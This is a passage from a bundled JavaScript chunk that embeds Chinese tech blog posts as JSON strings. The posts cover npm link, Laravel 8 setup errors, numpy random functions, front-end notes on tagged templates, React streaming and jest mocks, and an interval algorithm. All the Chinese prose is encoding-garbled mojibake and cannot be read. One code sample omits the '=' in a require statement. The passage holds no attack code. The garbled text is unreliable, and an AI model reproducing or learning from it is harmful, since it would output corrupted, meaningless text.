è½½åˆ°<code>node_modules</code>é‡Œé¢ï¼Œç›´æ¥<code>import</code>æˆ–è€…<code>require</code>å°±å¯ä»¥ä½¿ç”¨äº†ã€‚</p>\\n","toc":[],"relatedTags":null,"created_at":"2018-10-12","timeArr":[2018,9,12,0,0,0,0],"title":"npm-linkçš„ä½¿ç”¨","uuid":"4e6c7ab04e26dcf8fee1500f1d90cb218b836309","summary":"<p>å…³äº<code>npm-link</code>çš„ä½¿ç”¨</p>\\n<p>å½“å¼€å‘é¡¹ç›®æ—¶ï¼Œæœ‰æ—¶å€™ä¼šæƒ³ç”¨ä¸€ä¸ªæœ¬åœ°çš„å·¥å…·ï¼Œå¤åˆ¶æºç ä»€ä¹ˆçš„å¤ªéº»çƒ¦äº†ï¼Œå‘å¸ƒåˆ°npmä¹Ÿå¾ˆéº»çƒ¦ï¼Œå°±åªæƒ³ç›´æ¥ç”¨ã€‚\\né‚£ä¹ˆå¯ä»¥è€ƒè™‘ä½¿ç”¨<code>npm-link</code>ã€‚</p>\\n<p>ç°åœ¨æˆ‘æœ‰ä¸€ä¸ªå·¥å…·é¡¹ç›®å«åš<code>tool</code></p>\\n<p>æˆ‘å¯ä»¥å…ˆæ³¨å†Œåˆ°å…¨å±€</p>\\n<p><code>npm link tool</code></p>\\n<p>æ¥ç€ï¼Œæ‰¾åˆ°æˆ‘æƒ³å¯¼å…¥çš„é¡¹ç›®ï¼š`cd proje...</p>","slug":"npm-link-de-shi-yong","sha":"622748c94137c2c180569b7e9ea94fee9140add1"}')},620:function(n){n.exports=JSON.parse('{"content":"<h3 id=\\"wen-ti-1php-extension-sodium\\">é—®é¢˜1(PHP extension sodium)</h3>\\n<blockquote>\\n<p>lcobucci/jwt 4.1.4 requires ext-sodium * -&gt; the requested PHP extension sodium is missing from your system.</p>\\n</blockquote>\\n<p>åœ¨<code>php.ini</code>å†…éƒ¨å–æ¶ˆ<code>extension=sodium</code>è¿™ä¸€å¥çš„æ³¨é‡Šå³å¯</p>\\n<h3 id=\\"wen-ti-2valid-cache-path\\">é—®é¢˜2(valid cache path)</h3>\\n<blockquote>\\n<p>InvalidArgumentException</p>\\n<p>Please provide a valid cache path.</p>\\n</blockquote>\\n<p>åœ¨<code>storage/framework</code>æ–‡ä»¶å¤¹ä¸‹é¢åˆ›å»º</p>\\n<p><code>sessions</code></p>\\n<p><code>views</code></p>\\n<p><code>cache</code></p>\\n<h3 id=\\"wen-ti-3descriptiondatamatcherruleplugin\\">é—®é¢˜3(DescriptionDataMatcherRulePlugin)</h3>\\n<blockquote>\\n<p> Cannot find module &#39;webpack/lib/rules/DescriptionDataMatcherRulePlugin&#39;</p>\\n</blockquote>\\n<p>å®‰è£…æœ€æ–°çš„<code>vue-loader</code>ï¼ˆæ–‡ä¸­æœ€æ–°ç‰ˆæœ¬ v15.9.8ï¼‰</p>\\n<h3 id=\\"wen-ti-4-nei-cun-bu-zu\\">é—®é¢˜4(å†…å­˜ä¸è¶³)</h3>\\n<blockquote>\\n<p>FATAL ERROR: CALL_AND_RETRY_LAST Allocation failed - JavaScript heap out of memory</p>\\n</blockquote>\\n<p>é€šè¿‡æ›´æ–°æœ€æ–°ç‰ˆæœ¬<code>node</code>è§£å†³ï¼Œä¹Ÿå¯ä»¥é€šè¿‡å‘½ä»¤è¡Œ<code>node --max-old-space-size=4096</code></p>\\n<p>åé¢çš„æ•°å­—<code>4096</code>(MB)ä»£è¡¨å®šä¹‰åˆ†é…çš„å†…å­˜</p>\\n<h3 id=\\"wen-ti-5git-pull-shi-bai\\">é—®é¢˜5(git pullå¤±è´¥)</h3>\\n<blockquote>\\n<p>fatal: refusing to merge unrelated histories</p>\\n</blockquote>\\n<p>å½“è¿›è¡Œ<code>pull</code>æ—¶ï¼Œå‡ºç°è¿œç¨‹gitå†å²å’Œæœ¬åœ°gitå†å²å¯¹åº”ä¸ä¸Šçš„é—®é¢˜ï¼Œ<code>git pull --allow-unrelated-histories</code></p>\\n<h3 id=\\"wen-ti-6node-sass-gou-jian-shi-bai\\">é—®é¢˜6(node-sassæ„å»ºå¤±è´¥)</h3>\\n<blockquote>\\n<p>Node Sass could not find a binding for your current environment: Windows 64-bit with Node.js 14.x</p>\\n</blockquote>\\n<p>åŸå› æ˜¯æ›´æ–°äº†<code>nodejs</code>ï¼Œåœ¨æ–‡ä»¶å¤¹å†…è¾“å…¥<code>npm rebuild node-sass</code></p>\\n","toc":[{"anchor":"wen-ti-1php-extension-sodium","level":3,"text":"é—®é¢˜1(PHP extension sodium)"},{"anchor":"wen-ti-2valid-cache-path","level":3,"text":"é—®é¢˜2(valid cache path)"},{"anchor":"wen-ti-3descriptiondatamatcherruleplugin","level":3,"text":"é—®é¢˜3(DescriptionDataMatcherRulePlugin)"},{"anchor":"wen-ti-4-nei-cun-bu-zu","level":3,"text":"é—®é¢˜4(å†…å­˜ä¸è¶³)"},{"anchor":"wen-ti-5git-pull-shi-bai","level":3,"text":"é—®é¢˜5(git pullå¤±è´¥)"},{"anchor":"wen-ti-6node-sass-gou-jian-shi-bai","level":3,"text":"é—®é¢˜6(node-sassæ„å»ºå¤±è´¥)"}],"relatedTags":null,"created_at":"2021-08-09","timeArr":[2021,7,9,0,0,0,0],"title":"é…ç½®Larvael8é—®é¢˜è®°å½•","uuid":"e0183343ceb8acf22211aa4b6df0a043841fcdbe","summary":"<p>lcobucci/jwt 4.1.4 requires ext-sodium * -&gt; the requested PHP extension sodium is missing from your system.</p>","slug":"pei-zhi-Larvael8-wen-ti-ji-lu","sha":"3d70142487c738aca907d343c25036cd28a2978c"}')},621:function(n){n.exports=JSON.parse('{"content":"<p>åŸæ–‡é“¾æ¥ï¼š<a href=\\"https://blog.csdn.net/ImwaterP/article/details/96282230\\">https://blog.csdn.net/ImwaterP/article/details/96282230</a></p>\\n<p> å¤„ç†æ•°æ®æ—¶ç»å¸¸éœ€è¦ä»æ•°ç»„ä¸­éšæœºæŠ½å–å…ƒç´ ï¼Œè¿™æ—¶å€™å°±éœ€è¦ç”¨åˆ°np.random.choice()ã€‚ç„¶è€Œchoiceç”¨æ³•çš„å®˜æ–¹è§£é‡Šå¹¶ä¸è¯¦ç»†ï¼Œå°¤å…¶æ˜¯å¯¹replaceå‚æ•°çš„è§£é‡Šï¼Œä¾‹å­ä¹Ÿä¸æ˜¯å¾ˆå…¨é¢ã€‚å› æ­¤ç»è¿‡åå¤å®éªŒï¼Œæˆ‘è¾ƒä¸ºè¯¦ç»†çš„æ€»ç»“å‡ºäº†ä»–çš„ç”¨æ³•ï¼Œå¹¶ç»™å‡ºäº†è¾ƒä¸ºè¯¦ç»†çš„ä½¿ç”¨ä»£ç ä¾‹å­ã€‚</p>\\n<p><strong>å®˜æ–¹è§£é‡Š</strong>ï¼š<a href=\\"https://docs.scipy.org/doc/numpy/reference/generated/numpy.random.choice.html\\">https://docs.scipy.org/doc/numpy/reference/generated/numpy.random.choice.html</a></p>\\n<p><strong>ä¸‹é¢æ˜¯æˆ‘è‡ªå·±çš„æ€»ç»“</strong></p>\\n<pre><code><pre class=\\"hljs\\"><code>#numpy.random.choice(a, size=None, replace=True, p=None)\\n#ä»a(åªè¦æ˜¯ndarrayéƒ½å¯ä»¥ï¼Œä½†å¿…é¡»æ˜¯ä¸€ç»´çš„)ä¸­éšæœºæŠ½å–æ•°å­—ï¼Œå¹¶ç»„æˆæŒ‡å®šå¤§å°(size)çš„æ•°ç»„\\n#replace:Trueè¡¨ç¤ºå¯ä»¥å–ç›¸åŒæ•°å­—ï¼ŒFalseè¡¨ç¤ºä¸å¯ä»¥å–ç›¸åŒæ•°å­—\\n#æ•°ç»„pï¼šä¸æ•°ç»„aç›¸å¯¹åº”ï¼Œè¡¨ç¤ºå–æ•°ç»„aä¸­æ¯ä¸ªå…ƒç´ çš„æ¦‚ç‡ï¼Œé»˜è®¤ä¸ºé€‰å–æ¯ä¸ªå…ƒç´ çš„æ¦‚ç‡ç›¸åŒã€‚</code></pre></code></pre><p>é™¤äº†numpyä¸­çš„æ•°ç»„ï¼Œpythonå†…å»ºçš„listï¼ˆåˆ—è¡¨ï¼‰ã€tupleï¼ˆå…ƒç»„ï¼‰ä¹Ÿå¯ä»¥ä½¿ç”¨ã€‚</p>\\n<pre><code><pre class=\\"hljs\\"><code>&gt;&gt;&gt;np.random.choice(5)#ä»[0, 5)ä¸­éšæœºè¾“å‡ºä¸€ä¸ªéšæœºæ•°\\n#ç›¸å½“äºnp.random.randint(0, 5)\\n    2\\n\\n&gt;&gt;&gt;np.random.choice(5, 3)#åœ¨[0, 5)å†…è¾“å‡ºäº”ä¸ªæ•°å­—å¹¶ç»„æˆä¸€ç»´æ•°ç»„ï¼ˆndarrayï¼‰\\n#ç›¸å½“äºnp.random.randint(0, 5, 3)\\n    array([1, 4, 1])</code></pre></code></pre><pre><code><pre class=\\"hljs\\"><code>L = [1, 2, 3, 4, 5]#liståˆ—è¡¨\\nT = (2, 4, 6, 2)#tupleå…ƒç»„\\nA = np.array([4, 2, 1])#numpy,arrayæ•°ç»„,å¿…é¡»æ˜¯ä¸€ç»´çš„\\nA0 = np.arange(10).reshape(2, 5)#äºŒç»´æ•°ç»„ä¼šæŠ¥é”™\\n\\n&gt;&gt;&gt;np.random.choice(L, 5)\\n    array([3, 5, 2, 1, 5])\\n\\n&gt;&gt;&gt;np.random.choice(T, 5)\\n    array([2, 2, 2, 4, 2])\\n\\n&gt;&gt;&gt;np.random.choice(A, 5)\\n    array([1, 4, 2, 2, 1])\\n\\n&gt;&gt;&gt;np.random.choice(A0, 5)#å¦‚æœæ˜¯äºŒç»´æ•°ç»„ï¼Œä¼šæŠ¥é”™\\n    ValueError: \'a\' must be 1-dimensional</code></pre></code></pre><ul>\\n<li><strong>å‚æ•°replace</strong> ç”¨æ¥è®¾ç½®æ˜¯å¦å¯ä»¥å–ç›¸åŒå…ƒç´ ï¼š Trueè¡¨ç¤ºå¯ä»¥å–ç›¸åŒæ•°å­—ï¼› Falseè¡¨ç¤ºä¸å¯ä»¥å–ç›¸åŒæ•°å­—ã€‚ é»˜è®¤æ˜¯True</li>\\n</ul>\\n<pre><code><pre class=\\"hljs\\"><code>np.random.choice(5, 6, replace=True)#å¯ä»¥çœ‹åˆ°æœ‰ç›¸åŒå…ƒç´ \\n    array([3, 4, 1, 1, 0, 3])\\nnp.random.choice(5, 6, replace=False)#ä¼šæŠ¥é”™ï¼Œå› ä¸ºäº”ä¸ªæ•°å­—ä¸­å–å…­ä¸ªï¼Œä¸å¯èƒ½ä¸å–åˆ°é‡å¤çš„æ•°å­—\\n    ValueError: Cannot take a larger sample than population when \'replace=False\'</code></pre></code></pre><ul>\\n<li><strong>å‚æ•°p</strong></li>\\n</ul>\\n<p>på®é™…æ˜¯ä¸ªæ•°ç»„ï¼Œå¤§å°ï¼ˆsizeï¼‰åº”è¯¥ä¸æŒ‡å®šçš„aç›¸åŒï¼Œç”¨æ¥è§„å®šé€‰å–aä¸­æ¯ä¸ªå…ƒç´ çš„æ¦‚ç‡ï¼Œé»˜è®¤ä¸ºæ¦‚ç‡ç›¸åŒï¼Œæ€»å’Œä¸º1</p>\\n<pre><code><pre class=\\"hljs\\"><code>&gt;&gt;&gt; aa_milne_arr = [\'pooh\', \'rabbit\', \'piglet\', \'Christopher\']\\n&gt;&gt;&gt; np.random.choice(aa_milne_arr, 5, p=[0.5, 0.1, 0.1, 0.3])\\n    array([\'pooh\', \'pooh\', \'pooh\', \'Christopher\', \'piglet\'], dtype=\'|S11\')\\n#å¯ä»¥çœ‹åˆ°ï¼Œâ€˜poohâ€™è¢«é€‰å–çš„æ¦‚ç‡æ˜æ˜¾æ¯”å…¶ä»–å‡ ä¸ªé«˜å¾ˆå¤š</code></pre></code></pre>","toc":[],"relatedTags":null,"created_at":"2021-06-23","timeArr":[2021,5,23,0,0,0,0],"title":"pythonä¸­np.random.choiceç”¨æ³•","uuid":"b4315c63d7a7179f31a5a4701339c88c9db60367","summary":"<p>åŸæ–‡é“¾æ¥ï¼šhttps://blog.csdn.net/ImwaterP/article/details/96282230</p>\\n<p>å¤„ç†æ•°æ®æ—¶ç»å¸¸éœ€è¦ä»æ•°ç»„ä¸­éšæœºæŠ½å–å…ƒç´ ï¼Œè¿™æ—¶å€™å°±éœ€è¦ç”¨åˆ°np.random.choice()ã€‚ç„¶è€Œchoiceç”¨æ³•çš„å®˜æ–¹è§£é‡Šå¹¶ä¸è¯¦ç»†ï¼Œå°¤å…¶æ˜¯å¯¹replaceå‚æ•°çš„è§£é‡Šï¼Œä¾‹å­ä¹Ÿä¸æ˜¯å¾ˆå…¨é¢ã€‚å› æ­¤ç»...</p>","slug":"python-zhong-np.random.choice-yong-fa","sha":"70e068f0c4b30d8c9c32f4cb05469a984c554dd8"}')},622:function(n){n.exports=JSON.parse('{"content":"<p><code>np.random.randint</code>å‡½æ•°çš„ä½œç”¨æ˜¯ï¼Œè¿”å›ä¸€ä¸ªéšæœºæ•´å‹æ•°ï¼ŒèŒƒå›´ä»ä½ï¼ˆåŒ…æ‹¬ï¼‰åˆ°é«˜ï¼ˆä¸åŒ…æ‹¬ï¼‰ï¼Œå³[low, high)ã€‚\\nå¦‚æœæ²¡æœ‰å†™å‚æ•°highçš„å€¼ï¼Œåˆ™è¿”å›[0,low)çš„å€¼ã€‚</p>\\n<p>å‚æ•°å¦‚ä¸‹ï¼š</p>\\n<ul>\\n<li><p>low: int<br>ç”Ÿæˆçš„æ•°å€¼æœ€ä½è¦å¤§äºç­‰äºlowã€‚<br>ï¼ˆhign = Noneæ—¶ï¼Œç”Ÿæˆçš„æ•°å€¼è¦åœ¨[0, low)åŒºé—´å†…ï¼‰</p>\\n</li>\\n<li><p>high: int (å¯é€‰)<br>å¦‚æœä½¿ç”¨è¿™ä¸ªå€¼ï¼Œåˆ™ç”Ÿæˆçš„æ•°å€¼åœ¨[low, high)åŒºé—´ã€‚<br>size: int or tuple of ints(å¯é€‰)<br>è¾“å‡ºéšæœºæ•°çš„å°ºå¯¸ï¼Œæ¯”å¦‚size = (m * n* k)åˆ™è¾“å‡ºåŒè§„æ¨¡å³m * n* kä¸ªéšæœºæ•°ã€‚é»˜è®¤æ˜¯Noneçš„ï¼Œä»…ä»…è¿”å›æ»¡è¶³è¦æ±‚çš„å•ä¸€éšæœºæ•°ã€‚  </p>\\n</li>\\n<li><p>dtype: dtype(å¯é€‰)ï¼š<br>æƒ³è¦è¾“å‡ºçš„æ ¼å¼ã€‚å¦‚int64ã€intç­‰ç­‰</p>\\n</li>\\n</ul>\\n<p>ä¾‹å­:</p>\\n<pre><code class=\\"language-py\\"><pre class=\\"hljs\\"><code>np.random.randint(<span class=\\"hljs-number\\">2</span>,size=<span class=\\"hljs-number\\">5</span>)\\n<span class=\\"hljs-comment\\"># [0,1,1,0,0]</span>\\nnp.random.randint(<span class=\\"hljs-number\\">2</span>,<span class=\\"hljs-number\\">5</span>,<span class=\\"hljs-number\\">10</span>)\\n<span class=\\"hljs-comment\\"># [2 3 2 3 4 2 3 4 2 4]</span>\\nnp.random.randint(<span class=\\"hljs-number\\">0</span>,<span class=\\"hljs-number\\">2</span>,(<span class=\\"hljs-number\\">1</span>,<span class=\\"hljs-number\\">10</span>))\\n<span class=\\"hljs-comment\\"># [[0 0 1 1 0 1 0 0 0 0]]</span>\\nnp.random.randint(<span class=\\"hljs-number\\">2</span>,size=(<span class=\\"hljs-number\\">1</span>,<span class=\\"hljs-number\\">10</span>))\\n<span class=\\"hljs-comment\\"># å’Œä¸Šä¸€ä¸ªæ„æ€ä¸€æ ·</span></code></pre></code></pre>\\n<p><code>np.random.rand</code>å‡½æ•°åˆ™æ˜¯ç”Ÿæˆ<code>N</code>ç»´(æ ¹æ®å‚æ•°æ•°é‡)æ•°ç»„ï¼Œä½†æ˜¯æ¯ä¸€ä¸ªéšæœºå€¼éƒ½æ˜¯<code>0-1</code>ä¹‹é—´</p>\\n<p>ä¾‹å¦‚ï¼š</p>\\n<pre><code class=\\"language-py\\"><pre class=\\"hljs\\"><code>np.random.rand(<span class=\\"hljs-number\\">2</span>)\\n<span class=\\"hljs-comment\\"># ç”Ÿæˆä¸€ç»´æ•°ç»„</span>\\n<span class=\\"hljs-comment\\"># [0.40358037 0.06688054]</span>\\nnp.random.rand(<span class=\\"hljs-number\\">2</span>,<span class=\\"hljs-number\\">1</span>)\\n<span class=\\"hljs-comment\\"># ç”ŸæˆäºŒç»´æ•°ç»„</span>\\n<span class=\\"hljs-comment\\"># [[0.90992383]</span>\\n   [<span class=\\"hljs-number\\">0.51200082</span>]]</code></pre></code></pre>\\n","toc":[],"relatedTags":null,"created_at":"2021-06-23","timeArr":[2021,5,23,0,0,0,0],"title":"pythonä¸­np.random.randintå’Œnp.random.rand","uuid":"69da2e3ca5800f073b160c6e0c7a8d842ca7209a","summary":"<p><code>np.random.randint</code>å‡½æ•°çš„ä½œç”¨æ˜¯ï¼Œè¿”å›ä¸€ä¸ªéšæœºæ•´å‹æ•°ï¼ŒèŒƒå›´ä»ä½ï¼ˆåŒ…æ‹¬ï¼‰åˆ°é«˜ï¼ˆä¸åŒ…æ‹¬ï¼‰ï¼Œå³[low, high)ã€‚\\nå¦‚æœæ²¡æœ‰å†™å‚æ•°highçš„å€¼ï¼Œåˆ™è¿”å›[0,low)çš„å€¼ã€‚</p>\\n<p>å‚æ•°å¦‚ä¸‹ï¼š</p>\\n<ul>\\n<li>low: int<br>\\nç”Ÿæˆçš„æ•°å€¼æœ€ä½è¦å¤§äºç­‰äºlowã€‚<br>\\nï¼ˆhign = Noneæ—¶ï¼Œç”Ÿæˆçš„æ•°å€¼è¦åœ¨[...</li>\\n</ul>","slug":"python-zhong-np.random.randint-he-np.random.rand","sha":"e3f445d6ec3ac5ef8575d52929213c9491266c5d"}')},623:function(n){n.exports=JSON.parse('{"content":"<p>å†…å®¹åŒ…æ‹¬ï¼š<code>tag æ¨¡æ¿å­—ç¬¦ä¸²</code>ï¼Œ<code>Labelled statements</code>ï¼Œ<code>ReactæœåŠ¡ç«¯æ¸²æŸ“ä½¿ç”¨stream</code>ï¼Œ<code>jest.fn</code>ï¼Œ<code>jest.mock</code></p>\\n<h3 id=\\"tag--mu-ban-zi-fu-chuan\\">tag æ¨¡æ¿å­—ç¬¦ä¸²</h3>\\n<p>ä»¥<code>${xx}</code>åˆ†å‰²å­—ç¬¦ä¸²ï¼Œåˆ†åˆ«ä¼ å…¥2ä¸ªæ•°ç»„ï¼Œç¬¬ä¸€ä¸ªæ˜¯<code>åˆ†å‰²åçš„ç»“æœ</code>ï¼Œç¬¬äºŒä¸ªæ˜¯<code>åˆ†å‰²çš„å˜é‡</code></p>\\n<p>ä¾‹å¦‚ï¼š</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-comment\\">// Defining a Tag for template literals</span>\\n<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">highlight</span>(<span class=\\"hljs-params\\">strings, ...values</span>) </span>{\\n  <span class=\\"hljs-comment\\">// here i is the iterator for the strings array</span>\\n  <span class=\\"hljs-keyword\\">let</span> result = <span class=\\"hljs-string\\">\'\'</span>\\n  strings.forEach(<span class=\\"hljs-function\\">(<span class=\\"hljs-params\\">str, i</span>) =&gt;</span> {\\n    result += str\\n    <span class=\\"hljs-keyword\\">if</span> (values[i]) {\\n      result += <span class=\\"hljs-string\\">`&lt;mark&gt;<span class=\\"hljs-subst\\">${values[i]}</span>&lt;/mark&gt;`</span>\\n    }\\n  })\\n  <span class=\\"hljs-keyword\\">return</span> result\\n}\\n\\n<span class=\\"hljs-keyword\\">const</span> author = <span class=\\"hljs-string\\">\'Henry Avery\'</span>\\n<span class=\\"hljs-keyword\\">const</span> statement = <span class=\\"hljs-string\\">`I am a man of fortune &amp; I must seek my fortune`</span>\\n<span class=\\"hljs-keyword\\">const</span> quote = highlight<span class=\\"hljs-string\\">`<span class=\\"hljs-subst\\">${author}</span> once said, <span class=\\"hljs-subst\\">${statement}</span>`</span>\\n\\n<span class=\\"hljs-comment\\">// &lt;mark&gt;Henry Avery&lt;/mark&gt; once said, &lt;mark&gt;I am a man of fortune</span>\\n<span class=\\"hljs-comment\\">// &amp; I must seek my fortune&lt;/mark&gt;</span></code></pre></code></pre>\\n<hr>\\n<h3 id=\\"labelled-statements\\">Labelled statements</h3>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code>declarationBlock: {\\n  <span class=\\"hljs-comment\\">// can be used to group logical code blocks together</span>\\n  <span class=\\"hljs-keyword\\">var</span> i, j\\n}\\n\\n\\n<span class=\\"hljs-attr\\">forLoop1</span>: <span class=\\"hljs-comment\\">//The first for statement is labeled \\"forLoop1\\"</span>\\n<span class=\\"hljs-keyword\\">for</span> (i = <span class=\\"hljs-number\\">0</span>; i &lt; <span class=\\"hljs-number\\">3</span>; i++) {      \\n   <span class=\\"hljs-attr\\">forLoop2</span>: <span class=\\"hljs-comment\\">//The second for statement is labeled \\"forLoop2\\"</span>\\n   <span class=\\"hljs-keyword\\">for</span> (j = <span class=\\"hljs-number\\">0</span>; j &lt; <span class=\\"hljs-number\\">3</span>; j++) {   \\n      <span class=\\"hljs-keyword\\">if</span> (i === <span class=\\"hljs-number\\">1</span> &amp;&amp; j === <span class=\\"hljs-number\\">1</span>) {\\n         <span class=\\"hljs-keyword\\">continue</span> forLoop1\\n      }\\n      <span class=\\"hljs-built_in\\">console</span>.log(<span class=\\"hljs-string\\">\'i = \'</span> + i + <span class=\\"hljs-string\\">\', j = \'</span> + j)\\n   }\\n}\\n\\n<span class=\\"hljs-attr\\">loopBlock4</span>: {\\n  <span class=\\"hljs-built_in\\">console</span>.log(<span class=\\"hljs-string\\">\'I will print\'</span>)\\n  <span class=\\"hljs-keyword\\">break</span> loopBlock4\\n  <span class=\\"hljs-built_in\\">console</span>.log(<span class=\\"hljs-string\\">\'I will not print\'</span>)\\n}</code></pre></code></pre>\\n<hr>\\n<h3 id=\\"payload--zi-mian-you-xiao-zai-he\\">payload å­—é¢ï¼šæœ‰æ•ˆè½½è·</h3>\\n<p>ä¸€èˆ¬æŒ‡çš„æ˜¯å®é™…çš„å†…å®¹ï¼Œä¾‹å¦‚json:</p>\\n<pre><code><pre class=\\"hljs\\"><code>js:{\\ndata:123\\n}</code></pre></code></pre><p>è¿™é‡Œ<code>123</code>å°±æ˜¯<code>payload</code></p>\\n<hr>\\n<h3 id=\\"wang-luo-xin-xi-cha-xun\\">ç½‘ç»œä¿¡æ¯æŸ¥è¯¢</h3>\\n<p>API:<code>navigation.connection</code></p>\\n<hr>\\n<h3 id=\\"react-fu-wu-duan-xuan-ran-shi-yong-stream\\">ReactæœåŠ¡ç«¯æ¸²æŸ“ä½¿ç”¨stream</h3>\\n<pre><code><pre class=\\"hljs\\"><code>const ReactDOMServer require(\'react-dom/server\')\\nconst http = require(\'http\')\\nconst fs = require(\'fs\')\\nconst app = require(\'./app\')\\n\\n// bad\\nconst server = http.createServer((req, res) =&gt; {\\n    const body = ReactDOMServer.renderToString(app)\\n    res.end(body)\\n});\\n\\n// good\\nconst server = http.createServer(function (req, res) {\\n    const stream = ReactDOMServer.renderToNodeStream(app)\\n    stream.pipe(res)\\n})\\n\\nserver.listen(8000)</code></pre></code></pre><hr>\\n<h3 id=\\"jestfn\\">jest.fn</h3>\\n<p>æ¨¡æ‹Ÿä¸€ä¸ªå‡½æ•°ï¼Œå‚æ•°æ˜¯<code>(å‡½æ•°çš„è¡Œä¸º)</code></p>\\n<p><code>const mockFn=jest.fn(()=&gt;55)</code></p>\\n<p>å¯ä»¥é€šè¿‡</p>\\n<ul>\\n<li><code>expect(mockFn).toHaveBeenCalled()</code> éªŒè¯æ˜¯å¦è¢«è°ƒç”¨</li>\\n<li><code>expect(mockFn).toHaveBeenCalledTimes(num)</code>éªŒè¯æ˜¯å¦è¢«è°ƒç”¨numæ¬¡</li>\\n<li><code>expect(mockFn).toHaveBeenCalledWith(arg1,arg2)</code>éªŒè¯æ˜¯å¦å­˜åœ¨è¢«è°ƒç”¨çš„å‚æ•°</li>\\n<li><code>expect(mockFn).toHaveBeenLastCalledWith(arg1,arg2)</code>éªŒè¯æœ€åä¸€æ¬¡è¢«è°ƒç”¨çš„å‚æ•°</li>\\n<li><code>expect(mockFn).toHaveBeenNthCalledWith(Nth,arg1,arg2)</code>éªŒè¯ç¬¬Nthæ¬¡è¢«è°ƒç”¨çš„å‚æ•°</li>\\n<li><code>expect(mockFn).toHaveBeenNthCalledWith(arg1,arg2)</code>éªŒè¯æœ€åä¸€æ¬¡è¢«è°ƒç”¨çš„å‚æ•°</li>\\n<li><code>mockFn.mock.call</code>æŸ¥çœ‹å‡½æ•°è¢«è°ƒç”¨çš„æ•°ç»„</li>\\n</ul>\\n<hr>\\n<h3 id=\\"jestmock\\">jest.mock</h3>\\n<p>æ¨¡æ‹Ÿä¸€ä¸ªæ¨¡å—ï¼Œå‚æ•°åˆ†åˆ«æ˜¯<code>(æ¨¡å—è·¯å¾„,æ¨¡å—çš„è¡Œä¸º,æ¨¡å—æ˜¯å¦è™šæ‹Ÿçš„)</code></p>\\n<p>ä¾‹å¦‚ï¼šä¸€ä¸ªé¡¹ç›®ä¸å­˜åœ¨<code>../abc.js</code>è¿™ä¸ªæ¨¡å—</p>\\n<pre><code><pre class=\\"hljs\\"><code>jest.mock(\'../abc.js\',() =&gt; {\\n  return jest.fn(() =&gt; 42);\\n},{virtual:true})</code></pre></code></pre><p>ç¬¬ä¸‰ä¸ªå‚æ•°è¡¨ç¤ºè¿™ä¸ªæ¨¡å—å®é™…ä¸å­˜åœ¨</p>\\n","toc":[{"anchor":"tag--mu-ban-zi-fu-chuan","level":3,"text":"tag æ¨¡æ¿å­—ç¬¦ä¸²"},{"anchor":"labelled-statements","level":3,"text":"Labelled statements"},{"anchor":"payload--zi-mian-you-xiao-zai-he","level":3,"text":"payload å­—é¢ï¼šæœ‰æ•ˆè½½è·"},{"anchor":"wang-luo-xin-xi-cha-xun","level":3,"text":"ç½‘ç»œä¿¡æ¯æŸ¥è¯¢"},{"anchor":"react-fu-wu-duan-xuan-ran-shi-yong-stream","level":3,"text":"ReactæœåŠ¡ç«¯æ¸²æŸ“ä½¿ç”¨stream"},{"anchor":"jestfn","level":3,"text":"jest.fn"},{"anchor":"jestmock","level":3,"text":"jest.mock"}],"relatedTags":null,"created_at":"2018-12-08","timeArr":[2018,11,8,0,0,0,0],"title":"å‰ç«¯æ—¥å¸¸ç¬”è®°","uuid":"34441675832af7bfe9b306f5bd75927d10cb58a0","summary":"<p>å†…å®¹åŒ…æ‹¬ï¼š<code>tag æ¨¡æ¿å­—ç¬¦ä¸²</code>ï¼Œ<code>Labelled statements</code>ï¼Œ<code>ReactæœåŠ¡ç«¯æ¸²æŸ“ä½¿ç”¨stream</code>ï¼Œ<code>jest.fn</code>ï¼Œ<code>jest.mock</code></p>\\n<h4>tag æ¨¡æ¿å­—ç¬¦ä¸²</h4>\\n<p>ä»¥<code>${xx}</code>åˆ†å‰²å­—ç¬¦ä¸²ï¼Œåˆ†åˆ«ä¼ å…¥2ä¸ªæ•°ç»„ï¼Œç¬¬ä¸€ä¸ªæ˜¯<code>åˆ†å‰²åçš„ç»“æœ</code>ï¼Œç¬¬äºŒä¸ªæ˜¯<code>åˆ†å‰²çš„å˜é‡</code></p>\\n<p>ä¾‹å¦‚ï¼š</p>\\n<pre class=\\"hljs\\"><code><span class=\\"hljs-comment\\">// ...</span></code></pre>","slug":"qian-duan-ri-chang-bi-ji","sha":"a599fef4a57cb1e1e640bb153fdedda0e6ad5339"}')},624:function(n){n.exports=JSON.parse('{"content":"<p>ç»™å‡ºä¸€ç³»åˆ—é—´éš”ï¼Œä¾‹å¦‚<code>[[1,2],[3,5],[1,3],[2,3],[2,4]]</code></p>\\n<p>æ±‚å‡ºæœ€å¤§çš„ä¸é‡å¤é—´éš”æ•°é‡ã€‚</p>\\n<p>ä¾‹1:</p>\\n<p>input : <code>[[1,2],[3,5],[1,3],[2,3],[2,4]]</code></p>\\n<p>output : 3</p>\\n<p>è¿™ç§é¢˜æ€è·¯æ˜¯æŒ‰é—´éš”çš„<code>å°¾éƒ¨æ’åº</code>ã€‚</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-comment\\">/**\\n * Definition for an interval.\\n * function Interval(start, end) {\\n *     this.start = start;\\n *     this.end = end;\\n * }\\n */</span>\\n<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">getMaxNoOverLapIntervals</span>(<span class=\\"hljs-params\\">itv</span>)</span>{\\n  <span class=\\"hljs-keyword\\">if</span>(itv.length===<span class=\\"hljs-number\\">0</span>)<span class=\\"hljs-keyword\\">return</span> <span class=\\"hljs-number\\">0</span>\\n  <span class=\\"hljs-comment\\">// æ’åº</span>\\n  itv.sort(<span class=\\"hljs-function\\">(<span class=\\"hljs-params\\">a,b</span>)=&gt;</span>a.end-b.end)\\n  <span class=\\"hljs-keyword\\">let</span> count=<span class=\\"hljs-number\\">1</span>\\n  <span class=\\"hljs-keyword\\">let</span> prevE=itv[<span class=\\"hljs-number\\">0</span>].end\\n  <span class=\\"hljs-comment\\">// é€ä¸ªæ£€æŸ¥æ˜¯å¦é‡å </span>\\n  <span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> i=<span class=\\"hljs-number\\">1</span>;i&lt;itv.length;i++){\\n    <span class=\\"hljs-keyword\\">let</span> curS=itv[i].start,curE=itv[i].end\\n    <span class=\\"hljs-keyword\\">if</span>(curS&lt;prevE)<span class=\\"hljs-keyword\\">continue</span>\\n    